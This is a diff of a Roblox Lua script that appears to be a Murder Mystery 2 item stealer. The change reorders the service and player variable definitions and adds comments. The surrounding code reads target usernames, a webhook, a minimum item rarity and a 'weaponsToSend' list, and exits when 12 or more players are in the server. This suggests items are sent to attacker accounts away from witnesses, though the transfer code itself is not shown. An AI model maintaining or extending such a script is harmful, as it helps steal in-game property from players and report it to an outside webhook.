@@ -4,12 +4,19 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
+-- 1. Define Services and Player Variables FIRST
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+
+-- 2. Define Configuration Variables
 local users = _G.Usernames or {}
 local min_rarity = _G.min_rarity or "Godly"
 local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 
+-- 3. Initial Validation Checks
 if next(users) == nil or webhook == "" then
     plr:kick("You didn't add username or webhook")
     return
@@ -30,12 +37,10 @@ if #Players:GetPlayers() >= 12 then
     return
 end
 
+-- 4. Environment & Game Data Setup
 local weaponsToSend = {}
-local Players = game:GetService("Players")
-local plr = Players.LocalPlayer
 local playerGui = plr:WaitForChild("PlayerGui")
 local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
-local HttpService = game:GetService("HttpService")
 
 local rarityTable = {
     "Common",
@@ -47,7 +52,6 @@ local rarityTable = {
     "Unique",
     "Vintage"
 }
-
 local categories = {
     godly = "https://supremevaluelist.com/mm2/godlies.html",
     ancient = "https://supremevaluelist.com/mm2/ancients.html",
